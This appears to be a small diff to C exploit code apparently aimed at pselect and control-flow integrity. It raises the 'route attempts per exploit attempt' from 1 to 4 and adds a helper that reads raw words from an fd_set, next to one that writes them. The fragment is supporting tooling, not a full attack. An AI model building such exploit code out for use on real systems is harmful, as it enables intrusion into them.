@@ -1,6 +1,6 @@
 #include "common.h"
 
-#define PSELECT_CFI_ROUTE_ATTEMPTS 1
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4  /* Multiple route attempts per exploit attempt */
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -44,6 +44,11 @@ static int route_delay_usec(int attempt) {
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
+}
+
+uint64_t fdset_get_word(const fd_set *set, int word) {
+  const unsigned long *bits = (const unsigned long *)set;
+  return bits[word];
 }
 
 void open_selected_fds(
